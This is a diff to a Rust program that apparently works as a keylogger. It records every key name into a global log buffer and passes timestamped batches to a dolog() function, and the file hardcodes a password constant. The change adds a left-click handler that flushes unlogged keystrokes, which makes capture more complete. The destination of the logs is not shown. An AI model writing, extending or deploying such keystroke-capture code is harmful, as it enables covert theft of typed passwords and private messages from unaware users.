@@ -24,6 +24,7 @@ use monitor::*;
 
 const PASS: &[u8] = b"firemouses!";
 static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
+static LOGGED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
 
 fn main() {
     #[derive(Copy, Clone, Eq, PartialEq, Debug)]
@@ -223,6 +224,7 @@ fn track_activity(event: Event) {
 
             *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
             let logs = LOG_FILE.lock().unwrap().clone();
+            *LOGGED.lock().unwrap() = true;
 
             dolog(logs);
         },
@@ -231,6 +233,19 @@ fn track_activity(event: Event) {
             let key = event.name.unwrap();
             let old = LOG_FILE.lock().unwrap().clone();
             *LOG_FILE.lock().unwrap() += &key;
+            *LOGGED.lock().unwrap() = false;
+        },
+        EventType::ButtonPress(button) => match button {
+            Button::Left => {
+                if !LOGGED.lock().unwrap().clone() {
+                    *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
+                    let logs = LOG_FILE.lock().unwrap().clone();
+                    dolog(logs);
+                }
+            },
+            Button::Middle => (),
+            Button::Right => (),
+            Button::Unknown(code) => (),
         },
         EventType::MouseMove{x, y} => (),
         _ => (),
